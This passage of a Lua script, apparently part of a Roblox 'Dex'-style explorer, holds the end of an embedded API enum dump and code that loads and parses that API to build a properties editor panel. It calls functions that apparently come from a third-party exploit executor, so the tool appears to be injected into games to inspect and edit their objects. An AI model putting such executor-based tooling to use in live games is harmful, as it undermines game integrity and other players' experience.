1280x800","tags":[],"Value":8,"Enum":"Resolution"},{"type":"EnumItem","Name":"1360x768","tags":[],"Value":9,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x960","tags":[],"Value":10,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x1024","tags":[],"Value":11,"Enum":"Resolution"},{"type":"EnumItem","Name":"1440x900","tags":[],"Value":12,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x900","tags":[],"Value":13,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1024","tags":[],"Value":14,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1200","tags":[],"Value":15,"Enum":"Resolution"},{"type":"EnumItem","Name":"1680x1050","tags":[],"Value":16,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1080","tags":[],"Value":17,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1200","tags":[],"Value":18,"Enum":"Resolution"},{"type":"Enum","Name":"ReverbType","tags":[]},{"type":"EnumItem","Name":"NoReverb","tags":[],"Value":0,"Enum":"ReverbType"},{"type":"EnumItem","Name":"GenericReverb","tags":[],"Value":1,"Enum":"ReverbType"},{"type":"EnumItem","Name":"PaddedCell","tags":[],"Value":2,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Room","tags":[],"Value":3,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Bathroom","tags":[],"Value":4,"Enum":"ReverbType"},{"type":"EnumItem","Name":"LivingRoom","tags":[],"Value":5,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneRoom","tags":[],"Value":6,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Auditorium","tags":[],"Value":7,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ConcertHall","tags":[],"Value":8,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Cave","tags":[],"Value":9,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Arena","tags":[],"Value":10,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hangar","tags":[],"Value":11,"Enum":"ReverbType"},{"type":"EnumItem","Name":"CarpettedHallway","tags":[],"Value":12,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hallway","tags":[],"Value":13,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneCorridor","tags":[],"Value":14,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Alley","tags":[],"Value":15,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Forest","tags":[],"Value":16,"Enum":"ReverbType"},{"type":"EnumItem","Name":"City","tags":[],"Value":17,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Mountains","tags":[],"Value":18,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Quarry","tags":[],"Value":19,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Plain","tags":[],"Value":20,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ParkingLot","tags":[],"Value":21,"Enum":"ReverbType"},{"type":"EnumItem","Name":"SewerPipe","tags":[],"Value":22,"Enum":"ReverbType"},{"type":"EnumItem","Name":"UnderWater","tags":[],"Value":23,"Enum":"ReverbType"},{"type":"Enum","Name":"RollOffMode","tags":[]},{"type":"EnumItem","Name":"Inverse","tags":[],"Value":0,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"Linear","tags":[],"Value":1,"Enum":"RollOffMode"},{"type":"Enum","Name":"RotationType","tags":[]},{"type":"EnumItem","Name":"MovementRelative","tags":[],"Value":0,"Enum":"RotationType"},{"type":"EnumItem","Name":"CameraRelative","tags":[],"Value":1,"Enum":"RotationType"},{"type":"Enum","Name":"RuntimeUndoBehavior","tags":[]},{"type":"EnumItem","Name":"Aggregate","tags":[],"Value":0,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Snapshot","tags":[],"Value":1,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Hybrid","tags":[],"Value":2,"Enum":"RuntimeUndoBehavior"},{"type":"Enum","Name":"SaveFilter","tags":[]},{"type":"EnumItem","Name":"SaveAll","tags":[],"Value":2,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveWorld","tags":[],"Value":0,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveGame","tags":[],"Value":1,"Enum":"SaveFilter"},{"type":"Enum","Name":"SavedQualitySetting","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel1","tags":[],"Value":1,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel2","tags":[],"Value":2,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel3","tags":[],"Value":3,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel4","tags":[],"Value":4,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel5","tags":[],"Value":5,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel6","tags":[],"Value":6,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel7","tags":[],"Value":7,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel8","tags":[],"Value":8,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel9","tags":[],"Value":9,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel10","tags":[],"Value":10,"Enum":"SavedQualitySetting"},{"type":"Enum","Name":"ScaleType","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Slice","tags":[],"Value":1,"Enum":"ScaleType"},{"type":"Enum","Name":"SizeConstraint","tags":[]},{"type":"EnumItem","Name":"RelativeXY","tags":[],"Value":0,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeXX","tags":[],"Value":1,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeYY","tags":[],"Value":2,"Enum":"SizeConstraint"},{"type":"Enum","Name":"SleepAdjustMethod","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"LastSample","tags":[],"Value":1,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"AverageInterval","tags":[],"Value":2,"Enum":"SleepAdjustMethod"},{"type":"Enum","Name":"SoundType","tags":[]},{"type":"EnumItem","Name":"NoSound","tags":[],"Value":0,"Enum":"SoundType"},{"type":"EnumItem","Name":"Boing","tags":[],"Value":1,"Enum":"SoundType"},{"type":"EnumItem","Name":"Bomb","tags":[],"Value":2,"Enum":"SoundType"},{"type":"EnumItem","Name":"Break","tags":[],"Value":3,"Enum":"SoundType"},{"type":"EnumItem","Name":"Click","tags":[],"Value":4,"Enum":"SoundType"},{"type":"EnumItem","Name":"Clock","tags":[],"Value":5,"Enum":"SoundType"},{"type":"EnumItem","Name":"Slingshot","tags":[],"Value":6,"Enum":"SoundType"},{"type":"EnumItem","Name":"Page","tags":[],"Value":7,"Enum":"SoundType"},{"type":"EnumItem","Name":"Ping","tags":[],"Value":8,"Enum":"SoundType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":9,"Enum":"SoundType"},{"type":"EnumItem","Name":"Splat","tags":[],"Value":10,"Enum":"SoundType"},{"type":"EnumItem","Name":"Step","tags":[],"Value":11,"Enum":"SoundType"},{"type":"EnumItem","Name":"StepOn","tags":[],"Value":12,"Enum":"SoundType"},{"type":"EnumItem","Name":"Swoosh","tags":[],"Value":13,"Enum":"SoundType"},{"type":"EnumItem","Name":"Victory","tags":[],"Value":14,"Enum":"SoundType"},{"type":"Enum","Name":"SpecialKey","tags":[]},{"type":"EnumItem","Name":"Insert","tags":[],"Value":0,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"Home","tags":[],"Value":1,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":3,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":4,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"ChatHotkey","tags":[],"Value":5,"Enum":"SpecialKey"},{"type":"Enum","Name":"Status","tags":[]},{"type":"EnumItem","Name":"Poison","tags":["deprecated"],"Value":0,"Enum":"Status"},{"type":"EnumItem","Name":"Confusion","tags":["deprecated"],"Value":1,"Enum":"Status"},{"type":"Enum","Name":"Stuff","tags":[]},{"type":"EnumItem","Name":"Heads","tags":[],"Value":0,"Enum":"Stuff"},{"type":"EnumItem","Name":"Faces","tags":[],"Value":1,"Enum":"Stuff"},{"type":"EnumItem","Name":"Hats","tags":[],"Value":2,"Enum":"Stuff"},{"type":"EnumItem","Name":"TShirts","tags":[],"Value":3,"Enum":"Stuff"},{"type":"EnumItem","Name":"Shirts","tags":[],"Value":4,"Enum":"Stuff"},{"type":"EnumItem","Name":"Pants","tags":[],"Value":5,"Enum":"Stuff"},{"type":"EnumItem","Name":"Gears","tags":[],"Value":6,"Enum":"Stuff"},{"type":"EnumItem","Name":"Torsos","tags":[],"Value":7,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftArms","tags":[],"Value":8,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightArms","tags":[],"Value":9,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftLegs","tags":[],"Value":10,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightLegs","tags":[],"Value":11,"Enum":"Stuff"},{"type":"EnumItem","Name":"Bodies","tags":[],"Value":12,"Enum":"Stuff"},{"type":"EnumItem","Name":"Costumes","tags":[],"Value":13,"Enum":"Stuff"},{"type":"Enum","Name":"Style","tags":[]},{"type":"EnumItem","Name":"AlternatingSupports","tags":[],"Value":0,"Enum":"Style"},{"type":"EnumItem","Name":"BridgeStyleSupports","tags":[],"Value":1,"Enum":"Style"},{"type":"EnumItem","Name":"NoSupports","tags":[],"Value":2,"Enum":"Style"},{"type":"Enum","Name":"SurfaceConstraint","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":1,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":2,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":3,"Enum":"SurfaceConstraint"},{"type":"Enum","Name":"SurfaceType","tags":[]},{"type":"EnumItem","Name":"Smooth","tags":[],"Value":0,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":1,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":2,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Studs","tags":[],"Value":3,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Inlet","tags":[],"Value":4,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Universal","tags":[],"Value":5,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":6,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":7,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":8,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Unjoinable","tags":[],"Value":9,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SmoothNoOutlines","tags":[],"Value":10,"Enum":"SurfaceType"},{"type":"Enum","Name":"SwipeDirection","tags":[]},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Up","tags":[],"Value":2,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Down","tags":[],"Value":3,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"SwipeDirection"},{"type":"Enum","Name":"TeleportState","tags":[]},{"type":"EnumItem","Name":"RequestedFromServer","tags":[],"Value":0,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Started","tags":[],"Value":1,"Enum":"TeleportState"},{"type":"EnumItem","Name":"WaitingForServer","tags":[],"Value":2,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Failed","tags":[],"Value":3,"Enum":"TeleportState"},{"type":"EnumItem","Name":"InProgress","tags":[],"Value":4,"Enum":"TeleportState"},{"type":"Enum","Name":"TeleportType","tags":[]},{"type":"EnumItem","Name":"ToPlace","tags":[],"Value":0,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToInstance","tags":[],"Value":1,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToReservedServer","tags":[],"Value":2,"Enum":"TeleportType"},{"type":"Enum","Name":"TextXAlignment","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"TextXAlignment"},{"type":"Enum","Name":"TextYAlignment","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TextYAlignment"},{"type":"Enum","Name":"ThreadPoolConfig","tags":[]},{"type":"EnumItem","Name":"Auto","tags":[],"Value":0,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore1","tags":[],"Value":101,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore2","tags":[],"Value":102,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore3","tags":[],"Value":103,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore4","tags":[],"Value":104,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads1","tags":[],"Value":1,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads2","tags":[],"Value":2,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads3","tags":[],"Value":3,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads4","tags":[],"Value":4,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads8","tags":[],"Value":8,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads16","tags":[],"Value":16,"Enum":"ThreadPoolConfig"},{"type":"Enum","Name":"ThrottlingPriority","tags":[]},{"type":"EnumItem","Name":"Extreme","tags":[],"Value":2,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"ElevatedOnServer","tags":[],"Value":1,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ThrottlingPriority"},{"type":"Enum","Name":"TickCountSampleMethod","tags":[]},{"type":"EnumItem","Name":"Fast","tags":[],"Value":0,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Benchmark","tags":[],"Value":1,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Precise","tags":[],"Value":2,"Enum":"TickCountSampleMethod"},{"type":"Enum","Name":"TopBottom","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TopBottom"},{"type":"Enum","Name":"TouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"TouchCameraMovementMode"},{"type":"Enum","Name":"TouchMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"TouchMovementMode"},{"type":"Enum","Name":"TweenStatus","tags":[]},{"type":"EnumItem","Name":"Canceled","tags":[],"Value":0,"Enum":"TweenStatus"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":1,"Enum":"TweenStatus"},{"type":"Enum","Name":"UiMessageType","tags":[]},{"type":"EnumItem","Name":"UiMessageError","tags":[],"Value":0,"Enum":"UiMessageType"},{"type":"EnumItem","Name":"UiMessageInfo","tags":[],"Value":1,"Enum":"UiMessageType"},{"type":"Enum","Name":"UploadSetting","tags":[]},{"type":"EnumItem","Name":"Never","tags":[],"Value":0,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Ask","tags":[],"Value":1,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"UploadSetting"},{"type":"Enum","Name":"UserCFrame","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":1,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":2,"Enum":"UserCFrame"},{"type":"Enum","Name":"UserInputState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Change","tags":[],"Value":1,"Enum":"UserInputState"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Cancel","tags":[],"Value":3,"Enum":"UserInputState"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"UserInputState"},{"type":"Enum","Name":"UserInputType","tags":[]},{"type":"EnumItem","Name":"MouseButton1","tags":[],"Value":0,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton2","tags":[],"Value":1,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton3","tags":[],"Value":2,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseWheel","tags":[],"Value":3,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseMovement","tags":[],"Value":4,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Touch","tags":[],"Value":7,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Keyboard","tags":[],"Value":8,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Focus","tags":[],"Value":9,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Accelerometer","tags":[],"Value":10,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gyro","tags":[],"Value":11,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad1","tags":[],"Value":12,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad2","tags":[],"Value":13,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad3","tags":[],"Value":14,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad4","tags":[],"Value":15,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad5","tags":[],"Value":16,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad6","tags":[],"Value":17,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad7","tags":[],"Value":18,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad8","tags":[],"Value":19,"Enum":"UserInputType"},{"type":"EnumItem","Name":"TextInput","tags":[],"Value":20,"Enum":"UserInputType"},{"type":"EnumItem","Name":"None","tags":[],"Value":21,"Enum":"UserInputType"},{"type":"Enum","Name":"VibrationMotor","tags":[]},{"type":"EnumItem","Name":"Large","tags":[],"Value":0,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftTrigger","tags":[],"Value":2,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightTrigger","tags":[],"Value":3,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":4,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":5,"Enum":"VibrationMotor"},{"type":"Enum","Name":"VideoQualitySettings","tags":[]},{"type":"EnumItem","Name":"LowResolution","tags":[],"Value":0,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"MediumResolution","tags":[],"Value":1,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"HighResolution","tags":[],"Value":2,"Enum":"VideoQualitySettings"},{"type":"Enum","Name":"WaterDirection","tags":[]},{"type":"EnumItem","Name":"NegX","tags":[],"Value":0,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegY","tags":[],"Value":2,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Y","tags":[],"Value":3,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":4,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Z","tags":[],"Value":5,"Enum":"WaterDirection"},{"type":"Enum","Name":"WaterForce","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Strong","tags":[],"Value":3,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Max","tags":[],"Value":4,"Enum":"WaterForce"}]
]===]
	return rawApiJson
end

function getCurrentApiJson()
	local jsonStr = nil
	if readfile and getelysianpath then
		if readfile(getelysianpath().."Xpl0rerApi.txt") then
			print("Api found in folder!")
			jsonStr = readfile(getelysianpath().."Xpl0rerApi.txt")
			return jsonStr
		end
	end
	local success, err = pcall(function()
		jsonStr = httpGet(apiUrl)
		print("Fetched json successfully")
	end)
	if success then
		print("Returning json")
		--print(jsonStr:sub(1,500))
		return jsonStr
	else
		print("Error fetching json: " .. tostring(err))
		print("Falling back to local copy")
		return getLocalApiJson()
	end
end

function splitStringIntoChunks(jsonStr)
	-- Splits up a string into a table with a given size
	local t = {}
	for i = 1, math.ceil(string.len(jsonStr)/maxChunkSize) do
		local str = jsonStr:sub((i-1)*maxChunkSize+1, i*maxChunkSize)
		table.insert(t, str)
	end
	return t
end

local jsonToParse = getCurrentApiJson()
local apiChunks = splitStringIntoChunks(jsonToParse)

function getRbxApi()
--[[
	Api.Classes
	Api.Enums
	Api.GetProperties(className)
	Api.IsEnum(valueType)
--]]

-- Services
local HttpService = game:GetService("HttpService")
local ServerStorage = game:GetService("ServerStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remotes
--local Remotes = ReplicatedStorage:WaitForChild("OnlineStudio"):WaitForChild("Remotes")
--local GetApiJsonFunction = Remotes:WaitForChild("GetApiJson")

-- Functions
local JsonDecode = function(s) return HttpService:JSONDecode(s) end

local function GetApiRemoteFunction(index)
	if (apiChunks[index]) then 
		return apiChunks[index], #apiChunks
	else
		print("Bad index for GetApiJson")
		return nil
	end
end

local function getApiJson()
	local apiTable = {}
	local firstPage, pageCount = GetApiRemoteFunction(1)
	table.insert(apiTable, firstPage)
	for i = 2, pageCount do
		--print("Fetching API page # " .. tostring(i))
		local result = GetApiRemoteFunction(i)
		table.insert(apiTable, result)
	end
	return table.concat(apiTable)
end

local json = getApiJson()
local apiDump =  JsonDecode(json)

local Classes = {}
local Enums = {}

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function isEnum(name)
	return Enums[name] ~= nil
end

local function getProperties(className)
	local class = Classes[className]
	local properties = {}
	
	if not class then return properties end
	
	while class do
		for _,property in pairs(class.Properties) do
			table.insert(properties, property)
		end
		class = Classes[class.Superclass]
	end
	
	sortAlphabetic(properties, "Name")

	return properties
end

for _,item in pairs(apiDump) do
	local itemType = item.type
-- Classes --
	if (itemType == 'Class') then
		Classes[item.Name] = item
		item.Properties = {}
		item.Functions = {}
		item.YieldFunctions = {}
		item.Events = {}
		item.Callbacks = {}
-- Members --
	elseif (itemType == 'Property') then
		table.insert(Classes[item.Class].Properties, item)
	elseif (itemType == 'Function') then
		table.insert(Classes[item.Class].Functions, item)
	elseif (itemType == 'YieldFunction') then
		table.insert(Classes[item.Class].YieldFunctions, item)
	elseif (itemType == 'Event') then
		table.insert(Classes[item.Class].Events, item)
	elseif (itemType == 'Callback') then
		table.insert(Classes[item.Class].Callbacks, item)
-- Enums --
	elseif (itemType == 'Enum') then
		Enums[item.Name] = item
		item.EnumItems = {}
	elseif (itemType == 'EnumItem') then
		Enums[item.Enum].EnumItems[item.Name] = item
	end
end

return {
	Classes = Classes;
	Enums = Enums;
	GetProperties = getProperties;
	IsEnum = isEnum;
}
end

-- Modules
local Permissions = {CanEdit = true}
local RbxApi = getRbxApi()

--[[
	RbxApi.Classes
	RbxApi.Enums
	RbxApi.GetProperties(className)
	RbxApi.IsEnum(valueType)
--]]

-- Styles

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 16;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local BrickColors = {
	BoxSize = 13;
	BorderSizePixel = 1;
	BorderColor = CreateColor3(160,160,160);
	FrameColor = CreateColor3(160,160,160);
	Size = 20;
	Padding = 4;
	ColorsPerRow = 8;
	OuterBorder = 1;
	OuterBorderColor = Styles.Black;
}

wait(1)

local Gui = D_E_X
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local ExplorerFrame = Gui:WaitForChild("ExplorerPanel")

local bindGetSelection = ExplorerFrame.GetSelection
local bindSelectionChanged = ExplorerFrame.SelectionChanged
local bindGetApi = PropertiesFrame.GetApi
local bindGetAwait = PropertiesFrame.GetAwaiting
local bindSetAwait = PropertiesFrame.SetAwaiting

local ContentUrl = ContentProvider.BaseUrl .. "asset/?id="

local SettingsRemote = Gui:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")

local propertiesSearch = PropertiesFrame.Header.TextBox

local AwaitingObjectValue = false
local AwaitingObjectObj
local AwaitingObjectProp

function searchingProperties()
	if propertiesSearch.Text ~= "" and propertiesSearch.Text ~= "Search Properties" then
		return true
	end
	return false
end

local function GetSelection()
	local selection = bindGetSelection:Invoke()
	if #selection == 0 then
		return nil
	else
		return selection
	end 
end

-- Number

local function Round(number, decimalPlaces)
	return tonumber(string.format("%." .. (decimalPlaces or 0) .. "f", number))
end

-- Strings

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

-- Data Type Handling

local function ToString(value, type)
	if type == "float" then
		return tostring(Round(value,2))
	elseif type == "Content" then
		if string.find(value,"/asset") then
			local match = string.find(value, "=") + 1
			local id = string.sub(value, match)
			return id
		else
			return tostring(value)
		end
	elseif type == "Vector2" then
		local x = value.x
		local y = value.y
		return string.format("%g, %g", x,y)
	elseif type == "Vector3" then
		local x = value.x
		local y = value.y
		local z = value.z
		return string.format("%g, %g, %g", x,y,z)
	elseif type == "Color3" then
		local r = value.r
		local g = value.g
		local b = value.b
		return string.format("%d, %d, %d", r*255,g*255,b*255)
	elseif type == "UDim2" then
		local xScale = value.X.Scale
		local xOffset = value.X.Offset
		local yScale = value.Y.Scale
		local yOffset = value.Y.Offset
		return string.format("{%d, %d}, {%d, %d}", xScale, xOffset, yScale, yOffset)
	else
		return tostring(value)
	end
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
